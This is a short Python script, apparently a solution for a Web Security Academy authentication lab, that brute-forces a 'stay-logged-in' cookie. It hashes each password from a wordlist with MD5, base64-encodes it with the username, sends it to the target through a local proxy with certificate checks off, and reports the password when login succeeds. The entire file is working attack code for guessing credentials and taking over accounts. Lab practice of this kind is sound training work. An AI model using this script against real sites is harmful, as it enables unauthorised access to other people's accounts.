#!/usr/bin/env python3

#Author: Mohd Badrudduja
#Title: Brute-forcing a stay-logged-in cookie
#Module: Authentication Lab09 (Web Security Academy)
#Execution: Change password file, user and session id values accordingly.
#python3 lab09-exploit.py <url>

import requests
import sys
import urllib3
import hashlib
from hashlib import md5
import base64

urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit(url):
    file = "/root/Desktop/authentication/passwords.txt"
    with open(file, 'r') as outfile:
        passwords = outfile.read().split('\n')
    for passwd in passwords:
        username = '<User>'
        hash_obj = hashlib.md5(passwd.encode())
        md5_hash = hash_obj.hexdigest()
        cookie = (username + ":" + md5_hash)
        print(cookie)
        bs64_str = cookie.encode('ascii')
        bs64_enc = base64.b64encode(bs64_str)     # b'encoded-string'
        bs64_dec = bs64_enc.decode('ascii')       # encoded-string
        cookies = {'stay-logged-in': bs64_dec, 'session': '<SESS-ID>'}
        r = requests.get(url=url, cookies=cookies, verify=False, proxies=proxies)
        res = r.text
        if '<User>' in res:
            print("[+] Exploit syccessful...\n[+] Password for <User> is: " + passwd)
            break

def main():
    if len(sys.argv) != 2:
        print("[+] Example: %s www.test.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Creating stay-logged-in cookie.")
    exploit(url)

if __name__ == '__main__':
    main()
